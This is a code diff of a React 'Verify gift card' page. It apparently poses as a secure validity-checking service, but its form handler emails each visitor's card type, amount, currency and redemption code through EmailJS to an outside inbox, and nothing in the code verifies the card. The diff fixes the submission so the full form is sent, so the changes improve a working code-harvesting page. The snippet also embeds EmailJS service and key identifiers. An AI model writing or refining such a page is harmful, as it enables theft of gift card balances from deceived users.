@@ -18,14 +18,11 @@ const Contactsection = () => {
                 [name]: value,
             }
         })
-        console.log(cardDetails)
     }
     const handleForm = (e) => {
         e.preventDefault()
-        let { cardName, cardAmount, cardRedeptionCode, currency } = cardDetails
-        const messageBody = `The card type is ${cardName} and card price is ${cardAmount}. While the redemption code is ${cardRedeptionCode} the currency is in ${currency}`
         emailjs.sendForm('GoodluckCheckr', 'template_3ifu5oo',
-            messageBody, 'WBfx5IJfXs24MFMwVEsc0')
+        e.currentTarget, 'nZcZnmUU9IDSEpYuj')
             
             .then((result) => {
                 console.log(result.text);
@@ -39,7 +36,7 @@ const Contactsection = () => {
             <div class="py-5 lg:py-16 md:px-4 px-2 mx-auto">
                 <h2 class="mb-4 text-4xl tracking-tight font-extrabold text-center text-[#0B212F] dark:text-white capitalize">Verify gift card</h2>
                 <p class="mb-5 lg:mb-16 font-light text-center text-gray-500 dark:text-gray-400 sm:text-xl">Verify if your gift card is valid or not using our fast and secured gift card verification service.</p>
-                <form action="#" class="space-y-5 w-full items-center justify-center flex flex-col">
+                <form action="#" onSubmit={handleForm} class="space-y-5 w-full items-center justify-center flex flex-col">
                     <div className='w-full flex flex-col items-center justify-center'>
                         <label for="cardSelect" class=" md:w-[75%] w-[95%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-[#0B212F] dark:text-white">Select Card</label>
                         <select id="cardSelect" value={cardDetails.cardName} name='cardName' onChange={handleChange} class="bg-gray-50 h-[55px] w-[95%] md:w-[65%] border border-gray-300 text-[#0B212F] text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
@@ -80,14 +77,14 @@ const Contactsection = () => {
                     </div>
                     <div class="sm:col-span-2 w-full flex flex-col items-center justify-center">
                         <label for="cardRedeptionCode" class=" w-[95%] md:w-[75%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-gray-400">Redemption Code</label>
-                        <input type='text' onChange={handleChange}
+                        <input type='number' onChange={handleChange}
                             value={cardDetails.cardRedeptionCode}
                             id='cardRedeptionCode'
                             name='cardRedeptionCode'
                             class="block p-2.5 h-[55px] w-[95%] md:w-[65%] text-sm text-gray-900 bg-gray-50 rounded-lg shadow-sm border border-gray-300 focus:ring-primary-500 focus:border-primary-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-primary-500 dark:focus:border-primary-500"
                             placeholder="Redemption Code" />
                     </div>
-                    <button type="submit" class="py-3 px-5 h-[55px] w-[95%] md:w-[65%] text-sm font-medium text-center text-white rounded-lg bg-primary-700 bg-[#0B212F] hover:bg-[#0B212F] focus:ring-4 focus:outline-none focus:ring-primary-300 dark:bg-primary-600 dark:hover:bg-primary-700 dark:focus:ring-primary-800" onClick={handleForm}>Verify</button>
+                    <button type="submit" class="py-3 px-5 h-[55px] w-[95%] md:w-[65%] text-sm font-medium text-center text-white rounded-lg bg-primary-700 bg-[#0B212F] hover:bg-[#0B212F] focus:ring-4 focus:outline-none focus:ring-primary-300 dark:bg-primary-600 dark:hover:bg-primary-700 dark:focus:ring-primary-800" >Verify</button>
                 </form>
             </div>
         </section>
